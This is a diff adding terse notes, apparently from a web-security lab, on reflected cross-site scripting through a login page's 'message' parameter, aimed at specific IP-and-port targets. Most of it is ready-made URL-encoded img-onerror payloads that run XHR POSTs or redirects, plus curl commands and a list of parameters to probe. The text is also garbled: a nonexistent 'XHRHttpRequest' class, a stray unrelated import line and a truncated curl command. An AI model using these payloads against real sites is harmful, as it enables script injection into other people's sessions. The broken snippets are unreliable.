@@ -1,1 +1,28 @@
+### URL CROSS SITE SCRIPTING 
 
+http://178.128.42.95:31425/login?message=%3Cimg%20src=%27x%27%20onerror=%22var%20ry%20=%20window.location.search;%20var%20uri%20=%20new%20URLSearchParams(ry);%20console.log(uri.next())%22%3E
+
+http://167.71.135.225:30851/login?message=%3Cimg%20src=%22%22%20onerror=%22var%20xhr=new%20XHRHttpRequest;%20var%20body=%27{\%22term\%22:\%22reese\%22}%27;xhr.open(%27POST%27,%27/search%27,true);xhr.setRequestHeader(%27Content-Type%27,%27application/x-www-form-urlencoded;%20charset=UTF-8%27);xhr.send(body);console.log(xhr.status);%22%3E
+
+http://167.71.135.225:30851/login?message=%3Cimg%20src=%22%22%20onerror=%22window.location.assign(%27/964430b4cdd199af19b986eaf2193b21f32542d0%27);%20var%20xhr=new%20XMLHttpRequest;%20var%20body=%27%27;xhr.open(%27POST%27,%27/search%27,false);xhr.setRequestHeader(%27Content-Type%27,%27application/x-www-form-urlencoded;%20charset=UTF-8%27);xhr.send(body);console.log(xhr.status);%22%3E
+
+### LOOK FOOR 
+	
+	url/login?message=  # and other id 
+	url/login?action 
+		
+		etc...
+import {calcArea} from './first.js';	
+### XHR
+
+	var xhr = new XHRHttpRequest();
+	var body = ''
+	
+	xhr.open('POST', '/search', true);
+	xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+	xhr.send(body);
+
+### CURL 
+	
+	curl 167.71.135.225:30851/search -X POST -d 'reese' -H 'Content-Type: application/x-www-form-urlencoded'
+	curl 167.71.135.225:3X POST -d '"{}"'
